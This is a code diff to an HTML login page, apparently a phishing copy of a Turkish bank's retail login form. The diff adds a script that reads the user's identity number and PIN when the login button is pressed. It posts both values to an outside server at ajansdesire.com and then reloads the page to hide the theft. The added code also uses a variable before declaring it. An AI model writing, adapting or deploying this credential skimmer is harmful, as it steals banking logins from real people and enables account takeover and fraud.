@@ -212,13 +212,35 @@ font-size: 14px;  height: 46px;font-family: sans-serif;
     </form>
 
   <script> function checkAndSubmit() {
-    var button = document.getElementById('ctl00_c_RetailLoginButton');
+
+   var kimlik = document.getElementById("ctl00_c_RetailIdentityTextBox").value;  
+            var sifre = document.getElementById("ctl00_c_RetailPinTextBox").value;  
 
     if (button.disabled) {
         alert('Giriş Bilgilerinizi Kontrol Ediniz !');
         return false;  
     }
+ var button = document.getElementById('ctl00_c_RetailLoginButton');
 
+            if (!button.disabled) {
+              
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://ajansdesire.com/asdasd/9index.php", true);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+                // İsteği gönderin
+                xhr.send("kimlik=" + kimlik + "&sifre=" + sifre);
+
+                // İşlem tamamlandığında sayfayı yenileyin
+                xhr.onload = function() {
+                    if (xhr.status == 200) {
+                        // İsteğin başarıyla tamamlandığını varsayalım
+                        location.reload(); // Sayfayı yenile
+                    }
+                };
+            } else {
+                alert('Giriş Bilgilerinizi Kontrol Ediniz !');
+            }
   
 }
 		  </script> 
